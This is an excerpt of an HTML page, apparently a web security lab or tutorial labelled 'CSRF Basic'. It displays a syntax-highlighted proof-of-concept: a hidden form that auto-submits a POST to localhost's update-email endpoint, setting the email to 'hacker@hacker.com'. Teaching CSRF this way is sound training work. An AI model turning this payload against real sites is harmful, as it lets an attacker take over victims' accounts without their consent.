    ...
    <body class="bg-[#090a0f] text-gray-200 min-h-screen flex selection:bg-white selection:text-black antialiased"
            ...
            <div class="space-y-8">
                ...
                <div
                    ...
                    <div class="space-y-0.5">
                        <div class="text-sm font-semibold text-white tracking-wide">administrator</div>
        ...
        <main class="flex-1 p-8 md:p-12 max-w-4xl mx-auto w-full flex flex-col overflow-y-auto">
            ...
            <div class="flex justify-between items-center mb-12 pb-4 border-b border-zinc-800/60">
                <div>
                    ...
                    <p class="text-xs text-zinc-500">CSRF Basic</p>
                </div>
            </div>
        ...
        <script>
            ...
            var lines = [
                ...
                '    <span style="color:#569cd6;">&lt;title&gt;</span>CSRF PoC<span style="color:#569cd6;">&lt;/title&gt;</span>',
                '<span style="color:#569cd6;">&lt;/head&gt;</span>',
                '<span style="color:#569cd6;">&lt;body&gt;</span>',
                '    <span style="color:#569cd6;">&lt;form</span> <span style="color:#9cdcfe;">id</span>=<span style="color:#ce9178;">"csrfForm"</span>',
                '          <span style="color:#9cdcfe;">action</span>=<span style="color:#ce9178;">"http://localhost/update-email"</span>',
                '          <span style="color:#9cdcfe;">method</span>=<span style="color:#ce9178;">"POST"</span><span style="color:#569cd6;">&gt;</span>',
                '        <span style="color:#569cd6;">&lt;input</span> <span style="color:#9cdcfe;">type</span>=<span style="color:#ce9178;">"hidden"</span>',
                '               <span style="color:#9cdcfe;">name</span>=<span style="color:#ce9178;">"email"</span>',
                '               <span style="color:#9cdcfe;">value</span>=<span style="color:#ce9178;">"hacker@hacker.com"</span><span style="color:#569cd6;">&gt;</span>',
                '        <span style="color:#569cd6;">&lt;input</span> <span style="color:#9cdcfe;">type</span>=<span style="color:#ce9178;">"submit"</span>',
                '               <span style="color:#9cdcfe;">value</span>=<span style="color:#ce9178;">"Submit Request"</span><span style="color:#569cd6;">&gt;</span>',
                '    <span style="color:#569cd6;">&lt;/form&gt;</span>',
                '',
                '    <span style="color:#608b4e;">&lt;!-- Automatically submit the form on page load --&gt;</span>',
